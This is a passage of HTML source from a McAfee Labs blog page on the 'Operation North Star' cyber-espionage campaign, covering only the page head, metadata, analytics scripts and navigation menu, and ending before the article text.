<!DOCTYPE html>
<html lang="en-US">

    <head>

        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <link rel="profile" href="https://gmpg.org/xfn/11">
        <link rel="pingback" href="https://www.mcafee.com/xmlrpc.php">
                    <link rel="canonical" href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/">
                            <link rel="shortcut icon" href="https://www.mcafee.com/enterprise/en-us/img/favicon.ico">
        <!--<link rel="stylesheet" href="/wp-content/themes/securingtomorrow/css/responsive/blog.css" type="text/css">
        <link rel="stylesheet" href="/wp-content/themes/securingtomorrow/css/responsive/main.css" type="text/css">-->
        <link rel="stylesheet" href="/enterprise/www/css/main.min.css" type="text/css">
       
        	<script type="text/javascript">function theChampLoadEvent(e){var t=window.onload;if(typeof window.onload!="function"){window.onload=e}else{window.onload=function(){t();e()}}}</script>
		<script type="text/javascript">var theChampDefaultLang = 'en_US', theChampCloseIconPath = 'https://www.mcafee.com/wp-content/plugins/super-socializer/images/close.png';</script>
		<script> var theChampSiteUrl = 'https://www.mcafee.com/blogs', theChampVerified = 0, theChampEmailPopup = 0; </script>
		<style type="text/css">.the_champ_horizontal_sharing .theChampSharing{
					color: #fff;
				border-width: 0px;
		border-style: solid;
		border-color: transparent;
	}
		.the_champ_horizontal_sharing .theChampTCBackground{
		color:#666;
	}
		.the_champ_horizontal_sharing .theChampSharing:hover{
				border-color: transparent;
	}
	.the_champ_vertical_sharing .theChampSharing{
					color: #fff;
				border-width: 0px;
		border-style: solid;
		border-color: transparent;
	}
		.the_champ_vertical_sharing .theChampTCBackground{
		color:#666;
	}
		.the_champ_vertical_sharing .theChampSharing:hover{
				border-color: transparent;
	}
	@media screen and (max-width:783px){.the_champ_vertical_sharing{display:none!important}}div.heateor_ss_mobile_footer{display:none;}@media screen and (max-width:783px){i.theChampTCBackground{background-color:white!important}div.the_champ_bottom_sharing{width:100%!important;left:0!important;}div.the_champ_bottom_sharing li{width:12.5% !important;}div.the_champ_bottom_sharing .theChampSharing{width: 100% !important;}div.the_champ_bottom_sharing div.theChampTotalShareCount{font-size:1em!important;line-height:28px!important}div.the_champ_bottom_sharing div.theChampTotalShareText{font-size:.7em!important;line-height:0px!important}div.heateor_ss_mobile_footer{display:block;height:40px;}.the_champ_bottom_sharing{padding:0!important;display:block!important;width: auto!important;bottom:-2px!important;top: auto!important;}.the_champ_bottom_sharing .the_champ_square_count{line-height: inherit;}.the_champ_bottom_sharing .theChampSharingArrow{display:none;}.the_champ_bottom_sharing .theChampTCBackground{margin-right: 1.1em !important}}</style>
	
	<!-- This site is optimized with the Yoast SEO plugin v14.2 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Operation North Star: Behind The Scenes | McAfee Blogs</title>
	<meta name="description" content="Executive Summary It is rare to be provided an inside view on how major cyber espionage campaigns are conducted within the digital realm. The only" />
	<meta name="robots" content="index, follow" />
	<meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
	<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Operation North Star: Behind The Scenes | McAfee Blogs" />
	<meta property="og:description" content="Executive Summary It is rare to be provided an inside view on how major cyber espionage campaigns are conducted within the digital realm. The only" />
	<meta property="og:url" content="/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/" />
	<meta property="og:site_name" content="McAfee Blogs" />
	<meta property="article:publisher" content="https://www.facebook.com/mcafee" />
	<meta property="article:published_time" content="2020-11-05T16:00:20+00:00" />
	<meta property="article:modified_time" content="2020-11-05T16:10:15+00:00" />
	<meta property="og:image" content="https://www.mcafee.com/wp-content/uploads/2020/08/labs-thumbnail-3.jpeg" />
	<meta property="og:image:width" content="1920" />
	<meta property="og:image:height" content="1080" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:creator" content="@ChristiaanBeek" />
	<meta name="twitter:site" content="@mcafee" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://www.mcafee.com/blogs/#website","url":"https://www.mcafee.com/blogs/","name":"McAfee Blogs","description":"Securing Tomorrow. Today.","potentialAction":[{"@type":"SearchAction","target":"https://www.mcafee.com/blogs/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/#primaryimage","inLanguage":"en-US","url":"/wp-content/uploads/2020/08/labs-thumbnail-3.jpeg","width":1920,"height":1080},{"@type":"WebPage","@id":"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/#webpage","url":"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/","name":"Operation North Star: Behind The Scenes | McAfee Blogs","isPartOf":{"@id":"https://www.mcafee.com/blogs/#website"},"primaryImageOfPage":{"@id":"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/#primaryimage"},"datePublished":"2020-11-05T16:00:20+00:00","dateModified":"2020-11-05T16:10:15+00:00","author":{"@id":"https://www.mcafee.com/blogs/#/schema/person/b5594548f9e30297ea54990aff356e79"},"description":"Executive Summary It is rare to be provided an inside view on how major cyber espionage campaigns are conducted within the digital realm. The only","breadcrumb":{"@id":"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/"]}]},{"@type":"BreadcrumbList","@id":"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"/blogs/","url":"/blogs/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"/blogs/other-blogs/","url":"/blogs/other-blogs/","name":"Other Blogs"}},{"@type":"ListItem","position":3,"item":{"@type":"WebPage","@id":"/blogs/other-blogs/mcafee-labs/","url":"/blogs/other-blogs/mcafee-labs/","name":"McAfee Labs"}},{"@type":"ListItem","position":4,"item":{"@type":"WebPage","@id":"/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/","url":"/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/","name":"Operation North Star: Behind The Scenes"}}]},{"@type":["Person"],"@id":"https://www.mcafee.com/blogs/#/schema/person/b5594548f9e30297ea54990aff356e79","name":"Christiaan Beek","description":"Christiaan Beek, lead scientist &amp; sr. principal engineer is part of Mcafee\u2019s Office of the CTO leading strategic threat intelligence research within Mcafee. He coordinates and leads passionately the research in advanced attacks, plays a key-role in cyberattack take-down operations and participates in the NoMoreRansom project. In previous roles, Beek was Director of Threat Intelligence in McAfee Labs and Director of Incident Response and Forensics at Foundstone, McAfee\u2019s forensic services arm. At Foundstone, he led a team of forensic specialists in Europe, the Middle East, and Africa during major breaches. Beek develops threat intelligence strategy, designs threat intelligence systems, performs malware and forensic analysis, pentesting and coaches security teams around the globe. He is a passionate cybercrime specialist who has developed training courses, workshops, and presentations. He speaks regularly at conferences, including BlackHat, RSA, BlueHat and Botconf. Besides conferences, he is also frequently teaching at universities, Police Academies and public schools to recruit, mentor and train the next generation of cyber-security specialists. Beek contributed to the best-selling security book \"Hacking Exposed.\" and has two patents pending. Twitter: @ChristiaanBeek","sameAs":["https://www.linkedin.com/in/christiaanbeek/","https://twitter.com/ChristiaanBeek"]}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//stackpath.bootstrapcdn.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="McAfee Blogs &raquo; Feed" href="https://www.mcafee.com/blogs/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2"}};
			/*! This file is auto-generated */
			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css'  href='/wp-includes/css/dist/block-library/style.min.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='opinionStage_poll_oswp_style_css_set-css'  href='/wp-content/plugins/social-polls-by-opinionstage/gutenberg/poll/dist/blocks.style.build.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='opinionStage_trivia_oswp_style_css_set-css'  href='/wp-content/plugins/social-polls-by-opinionstage/gutenberg/trivia/dist/blocks.style.build.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='opinionStage_personality_oswp_style_css_set-css'  href='/wp-content/plugins/social-polls-by-opinionstage/gutenberg/personality/dist/blocks.style.build.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='opinionStage_survey_oswp_style_css_set-css'  href='/wp-content/plugins/social-polls-by-opinionstage/gutenberg/survey/dist/blocks.style.build.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='opinionStage_slideshow_oswp_style_css_set-css'  href='/wp-content/plugins/social-polls-by-opinionstage/gutenberg/slideshow/dist/blocks.style.build.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='opinionStage_form_oswp_style_css_set-css'  href='/wp-content/plugins/social-polls-by-opinionstage/gutenberg/form/dist/blocks.style.build.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='mpp_gutenberg-css'  href='/wp-content/plugins/metronet-profile-picture/dist/blocks.style.build.css?ver=2.3.8' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='/wp-includes/css/dashicons.min.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpmm_css-css'  href='/wp-content/plugins/wp-megamenu/assets/css/wpmm.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='wp_megamenu_generated_css-css'  href='/wp-content/uploads/wp-megamenu/wp-megamenu.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='featuresbox_css-css'  href='/wp-content/plugins/wp-megamenu/addons/wpmm-featuresbox/wpmm-featuresbox.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='postgrid_css-css'  href='/wp-content/plugins/wp-megamenu/addons/wpmm-gridpost/wpmm-gridpost.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wp-bootstrap-pro-fontawesome-cdn-css'  href='https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='open-sans-google-font-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A300%2C400&#038;ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='theme-css-css'  href='/wp-content/themes/securingtomorrow/style.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='the_champ_frontend_css-css'  href='/wp-content/plugins/super-socializer/css/front.css?ver=7.12.37' type='text/css' media='all' />
<link rel='stylesheet' id='addtoany-css'  href='/wp-content/plugins/add-to-any/addtoany.min.css?ver=1.15' type='text/css' media='all' />
<link rel='stylesheet' id='poppins-css'  href='//fonts.googleapis.com/css?family=Poppins%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2Cregular%2Citalic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='oswald-css'  href='//fonts.googleapis.com/css?family=Oswald%3A200%2C300%2Cregular%2C500%2C600%2C700&#038;ver=1.3.1' type='text/css' media='all' />
<script type='text/javascript' src='/wp-content/plugins/jquery-updater/js/jquery-3.4.1.min.js?ver=3.4.1'></script>
<script type='text/javascript' src='/wp-content/plugins/add-to-any/addtoany.min.js?ver=1.1'></script>
<script type='text/javascript' src='/wp-content/plugins/wp-megamenu/addons/wpmm-featuresbox/wpmm-featuresbox.js?ver=1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var postgrid_ajax_load = {"ajax_url":"https:\/\/www.mcafee.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='/wp-content/plugins/wp-megamenu/addons/wpmm-gridpost/wpmm-gridpost.js?ver=1'></script>
<!--[if lt IE 9]>
<script type='text/javascript' src='/wp-content/themes/securingtomorrow/js/html5.js?ver=3.7.0'></script>
<![endif]-->
<link rel='https://api.w.org/' href='https://www.mcafee.com/blogs/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.mcafee.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.mcafee.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.2" />
<link rel='shortlink' href='https://www.mcafee.com/blogs/?p=108199' />
<link rel="alternate" type="application/json+oembed" href="https://www.mcafee.com/blogs/wp-json/oembed/1.0/embed?url=%2Fblogs%2Fother-blogs%2Fmcafee-labs%2Foperation-north-star-behind-the-scenes%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://www.mcafee.com/blogs/wp-json/oembed/1.0/embed?url=%2Fblogs%2Fother-blogs%2Fmcafee-labs%2Foperation-north-star-behind-the-scenes%2F&#038;format=xml" />

<script data-cfasync="false">
window.a2a_config=window.a2a_config||{};a2a_config.callbacks=[];a2a_config.overlays=[];a2a_config.templates={};
(function(d,s,a,b){a=d.createElement(s);b=d.getElementsByTagName(s)[0];a.async=1;a.src="https://static.addtoany.com/menu/page.js";b.parentNode.insertBefore(a,b);})(document,"script");
</script>
<script>
var utag_data = {
tm_global_pagename:"",
tm_global_page_publish_date:"",
tm_global_businessunit:"consumer",
tm_global_sitesection:"",
tm_global_sitesection_level2:"",
tm_global_sitesection_level3:"",
tm_global_platform:"web",
tm_global_culture_code:"en-us",
tm_global_country:"united states",
tm_global_geo:"na",
tm_global_channel:"direct",
tm_global_affiliate_id:"",
tm_global_affiliate_name:"",
tm_global_campaign_id:"",
tm_global_page_version:"",
tm_global_pageurl:location.href,
tm_global_clientid :"",
tm_global_trafficsource:"",
tm_global_sourcetype:"blog",
tm_global_wssversion:"",
tm_global_coe:"",
tm_global_coe_level2:"",
tm_local_blogs_author:""
}
var sec=location.pathname.replace("/blogs","").split("/"); utag_data.tm_global_pagename="[consumer:web]";
if(sec.length > 2) {
for(i=1;i<sec.length-1;i++) {
utag_data.tm_global_pagename+="|"+sec[i];
if(i==1){utag_data.tm_global_sitesection=sec[i]}
if(i==2){utag_data.tm_global_sitesection_level2=sec[i]}
if(i==3){utag_data.tm_global_sitesection_level3=sec[i]}
}
}
else {
utag_data.tm_global_sitesection="Homepage"
utag_data.tm_global_pagename+="|Homepage"
}

var today = new Date(); var dd = today.getDate(); var mm = today.getMonth() + 1; var yyyy = today.getFullYear();
if (dd < 10) { dd = '0' + dd;    } 
if (mm < 10) {mm = '0' + mm;  } 
utag_data.tm_global_page_publish_date = dd + '/' + mm + '/' + yyyy;

</script>

<script>
	var ISOTOPE_CACHE 				=  [];
	var ISOTOPE_AJAX_URL 			= 'https://www.mcafee.com/wp-admin/admin-ajax.php';
	var ISOTOPE_AJAX_URL_ENDPOINT 	= 'https://www.mcafee.com/wp-content/plugins/ae-isotope/endpoint.php';
	var ISOTOPE_AJAX_ITEMS			= 25;
	var ISOTOPE_CURRENT_CATEGORY	= '';
</script>		<meta property="fb:app_id" content="346056175795920" />
					<meta property="fb:admins" content="100007220654854" />
			<style type="text/css">.wp-megamenu-wrap .wpmm-nav-wrap > ul.wp-megamenu li.wpmm_dropdown_menu ul.wp-megamenu-sub-menu li.menu-item-has-children.wp-megamenu-item-101284.wpmm-submenu-right > ul.wp-megamenu-sub-menu {left: 100%;}</style><style type="text/css"></style><link rel="icon" href="/wp-content/uploads/2018/11/cropped-favicon-32x32.png" sizes="32x32" />
<link rel="icon" href="/wp-content/uploads/2018/11/cropped-favicon-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="/wp-content/uploads/2018/11/cropped-favicon-180x180.png" />
<meta name="msapplication-TileImage" content="/wp-content/uploads/2018/11/cropped-favicon-270x270.png" />
         <link rel="stylesheet" href="/enterprise/www/css/blog.css" type="text/css">
                <script type="text/javascript">
            var digitalData = {"page":{"pageInfo":{"pageName":"other-blogs:mcafee-labs:operation-north-star-behind-the-scenes","pageNameGlobal":"operation-north-star-behind-the-scenes","pageLanguage":"English","pageType":"","country":"us","geo":"NA","onsiteSearchTerm":"","onsiteSearchType":"","category":{"category":"other-blogs","subCategory1":"mcafee-labs"},"author":"Christiaan Beek","pubDate":"Nov 05, 2020","metaData":{"keywords":""}}},"user":{"userInfo":{"ip":"161.69.31.4"}}}        </script>
                <script type='application/ld+json'>{
            "@context": "http://schema.org",
            "@type": "Article",
            "mainEntityOfPage": {
                "@type": "WebPage",
                "@id": "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/"
            },
           "headline": "Operation North Star: Behind The Scenes",
            "image": ["https://www.mcafee.com/wp-content/uploads/2020/08/labs-thumbnail-3.jpeg"],	
            "datePublished": "2020-11-05",
            "dateModified": "Nov 05, 2020",
            "author": {
                "@type": "Person",           
                "name": ["Christiaan Beek","Ryan Sherstobitoff"]            
            },
            "publisher": {
                "@type": "Organization",
                "name": "McAfee",
                "logo": {
                    "@type": "ImageObject",
                    "url": "https://www.mcafee.com/enterprise/en-us/img/logos/mcafee-logo.png"
                }
            },
            "description": "Executive SummaryIt is rare to be provided an inside view on how major cyber espionage campaigns are conducted within the digital realm. The only transparency afforded is a limited view of victims, a malware sample, and perhaps the IP addresses of historical command and control (C2) infrastructure.The Operation North"        
            }
        </script>
        <style>
            #wp-megamenu-blog>.wpmm-nav-wrap ul.wp-megamenu>li>a{
                color:#ffffff !important;
            }
        </style> 
    
    <script>!function(){function o(n,i){if(n&&i)for(var r in i)i.hasOwnProperty(r)&&(void 0===n[r]?n[r]=i[r]:n[r].constructor===Object&&i[r].constructor===Object?o(n[r],i[r]):n[r]=i[r])}try{var n=decodeURIComponent("%7B%20%22BW%22%3A%20%7B%20%22test_https%22%3A%20true%20%7D%20%7D");if(n.length>0&&window.JSON&&"function"==typeof window.JSON.parse){var i=JSON.parse(n);void 0!==window.BOOMR_config?o(window.BOOMR_config,i):window.BOOMR_config=i}}catch(r){window.console&&"function"==typeof window.console.error&&console.error("mPulse: Could not parse configuration",r)}}();</script>
                          <script>!function(a){var e="https://s.go-mpulse.net/boomerang/",t="addEventListener";if("False"=="True")a.BOOMR_config=a.BOOMR_config||{},a.BOOMR_config.PageParams=a.BOOMR_config.PageParams||{},a.BOOMR_config.PageParams.pci=!0,e="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="LXNDQ-3SP7Y-P3JVN-Y4HAH-VQNKC",function(){function n(e){a.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!a.BOOMR||!a.BOOMR.version&&!a.BOOMR.snippetExecuted){a.BOOMR=a.BOOMR||{},a.BOOMR.snippetExecuted=!0;var i,_,o,r=document.createElement("iframe");if(a[t])a[t]("load",n,!1);else if(a.attachEvent)a.attachEvent("onload",n);r.src="javascript:void(0)",r.title="",r.role="presentation",(r.frameElement||r).style.cssText="width:0;height:0;border:0;display:none;",o=document.getElementsByTagName("script")[0],o.parentNode.insertBefore(r,o);try{_=r.contentWindow.document}catch(O){i=document.domain,r.src="javascript:var d=document.open();d.domain='"+i+"';void(0);",_=r.contentWindow.document}_.open()._l=function(){var a=this.createElement("script");if(i)this.domain=i;a.id="boomr-if-as",a.src=e+"LXNDQ-3SP7Y-P3JVN-Y4HAH-VQNKC",BOOMR_lstart=(new Date).getTime(),this.body.appendChild(a)},_.write("<bo"+'dy onload="document._l();">'),_.close()}}(),"".length>0)if(a&&"performance"in a&&a.performance&&"function"==typeof a.performance.setResourceTimingBufferSize)a.performance.setResourceTimingBufferSize();!function(){if(BOOMR=a.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var e=""=="true"?1:0,t="",n="fb23dtlilz6gqycyd44q-f-c2d22fd9d-clientnsv4-s.akamaihd.net",i={"ak.v":"30","ak.cp":"108209","ak.ai":parseInt("250743",10),"ak.ol":"0","ak.cr":4,"ak.ipv":4,"ak.proto":"http/1.1","ak.rid":"1a3b02a8","ak.r":30888,"ak.a2":e,"ak.m":"b","ak.n":"essl","ak.bpcip":"40.117.177.0","ak.cport":34076,"ak.gh":"23.201.31.149","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.csrc":"-","ak.acc":"reno","ak.t":"1616387897","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==6K9JIqm1VviTtzl6ruYuR6CIfBUBtEHyIB7Mx8tD/yk2+6YwLZYStbjG4G4ebBNS3hg76pbHXwWWJ7mliWU5lYWPm36SP3Swgwyfd2QsMcBkPHk9/SHBbY0nFkPXkD2TFB56S2eptehhrv9tALNpk87Yc+AMpuyRqg4jgCrFYiYlkxYERxTZWfL8PoGMIVtxuK9UvJI5GBOUdUhcrbypKf+uthN59vnG6FwUy+SG6As2m2X3oyqL9/ETAOwHZLsKPrzijp0dnHm5vC5tHbrBB1NuMe4/lMdK/VNZPuvUhI9n8AJsEPxpZw9qO7XBZ/p1jQWz+C8BH2wghB8cxTk31wcBjnr3jiu3k/gqN6F+2ynaOH2J/2rrKfUH6ViCbHBBh1kMchT2MG4tqAVeLpFlklALBgEPtYrS3/IG9Ygp36Q=","ak.pv":"141","ak.dpoabenc":""};if(""!==t)i["ak.ruds"]=t;var _={i:!1,av:function(e){var t="http.initiator";if(e&&(!e[t]||"spa_hard"===e[t]))i["ak.feo"]=void 0!==a.aFeoApplied?1:0,BOOMR.addVar(i)},rv:function(){var a=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.r","ak.acc","ak.t"];BOOMR.removeVar(a)}};BOOMR.plugins.AK={akVars:i,akDNSPreFetchDomain:n,init:function(){if(!_.i){var a=BOOMR.subscribe;a("before_beacon",_.av,null,null),a("onbeacon",_.rv,null,null),_.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script></head>

    <body  class="post-template-default single single-post postid-108199 single-format-standard wp-megamenu" id="short-header">
        <script src="/wp-content/themes/securingtomorrow/js/header_enterprise.js"></script>
        <div id="wrapper">
            <div class="textwidget custom-html-widget"><style>
	.headerbarContainer {
    background: rgba(0,0,0,0.9);
}
</style>
<header id="header">  
	<div class="headerbarContainer">
		<div class="headerbarContent">
			<div class="logo">
				 <img src="https://www.mcafee.com/enterprise/en-us/img/icons/logo-white.svg" alt="McAfee Logo"/>
			</div>
			<div class="quicklinks">
			 	<a class="symbols-label" href="https://www.mcafee.com/consumer/en-us/store/m0/index.html"><span>For Home</span></a>
			 	<a class="symbols-label" href="/enterprise/en-us/home.html"><span>For Enterprise</span></a>
			 	<a class="symbols-label" href="/enterprise/en-us/global-contact-us.html"><i class="symbol-contact"></i></a>
			</div>
		</div>
	</div>
</header>



<style>


@media screen and (min-width: 1025px) {
.hero{height: 756px !important;}
.hero.medium {
    min-height: 0;
    height: 640px  !important;
}
.hero.small {
    min-height: 0;
    height: 510px  !important;
}
.hero.title {
    height: 350px  !important;
}
	}
</style> 
<script>
$("document").ready(function(){
    $(".hero.title h1").each(function() {
        if ($(this).text().length > 50) {
            $(this).addClass("pt")
        }
    });
});
</script></div>  
		
<section class="hero title">
    <div class="bg-stretch">
        <img src="https://www.mcafee.com/wp-content/themes/securingtomorrow/img/light-shield-pattern.png" alt="">
    </div>
    <div class="container-fluid">
        <div class="row">
            <div class="col-sm-12 col-xs-12">
                <h1>Operation North Star: Behind The Scenes</h1>
            </div>
        </div>
    </div>
</section>

<main id="main">

    <nav class="anchor-links">
        <div class="container medium">
            <div style="float:left">
<nav id="wp-megamenu-blog" class="wp-megamenu-wrap   ">
			<div class="wpmm-fullwidth-wrap"></div>
			<div class="wpmm-nav-wrap wpmm-main-wrap-blog">
				<a href="javascript:;" class="wpmm_mobile_menu_btn show-close-icon"><i class="fa fa-bars"></i> Menu</a> 
					<ul id="menu-mcafee-blog-navigation-new-05020" class="wp-megamenu" ><li id="wp-megamenu-item-101279" class="menu-item menu-item-type-custom menu-item-object-custom wp-megamenu-item-101279  wpmm_mega_menu  wpmm-fadeindown wpmm-submenu-right"><a href="#">Consumer <b class="fa fa-angle-down"></b> </a>
<ul class="wp-megamenu-sub-menu" >
	<li id="wp-megamenu-item-3590707476820515721" class="wpmm-row wp-megamenu-item-3590707476820515721 wpmm-submenu-right">
	<ul class="wp-megamenu-sub-menu" >
		<li id="wp-megamenu-item-8159598261715932928" class="wpmm-col wpmm-col-12 wp-megamenu-item-8159598261715932928 wpmm-submenu-right">
		<ul class="wp-megamenu-sub-menu" >
			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-101279 wpmm-submenu-right"><div class="menu-consumer-category-container"><ul id="menu-consumer-category" class="menu"><li id="menu-item-97453" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97453"><a href="/blogs/consumer/hackable/">Hackable? Podcast</a></li>
<li id="menu-item-97424" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97424"><a href="/blogs/consumer/consumer-threat-notices/">Consumer Threat Notices</a></li>
<li id="menu-item-97425" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97425"><a href="/blogs/consumer/family-safety/">Family Safety</a></li>
<li id="menu-item-97426" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97426"><a href="/blogs/consumer/identity-protection/">Identity Protection</a></li>
<li id="menu-item-97427" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97427"><a href="/blogs/consumer/mobile-and-iot-security/">Mobile and IoT Security</a></li>
<li id="menu-item-101334" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-101334"><a href="/blogs/consumer/">All Consumer Blogs</a></li>
</ul></div></li>
		</ul>
</li>
	</ul>
</li>
</ul>
</li>
<li id="wp-megamenu-item-101280" class="menu-item menu-item-type-custom menu-item-object-custom wp-megamenu-item-101280  wpmm_mega_menu  wpmm-fadeindown wpmm-submenu-right"><a href="#">Enterprise <b class="fa fa-angle-down"></b> </a>
<ul class="wp-megamenu-sub-menu" >
	<li id="wp-megamenu-item-7091424432324463498" class="wpmm-row wp-megamenu-item-7091424432324463498 wpmm-submenu-right">
	<ul class="wp-megamenu-sub-menu" >
		<li id="wp-megamenu-item-1.5171453691824E+19" class="wpmm-col wpmm-col-12 wp-megamenu-item-1.5171453691824E+19 wpmm-submenu-right">
		<ul class="wp-megamenu-sub-menu" >
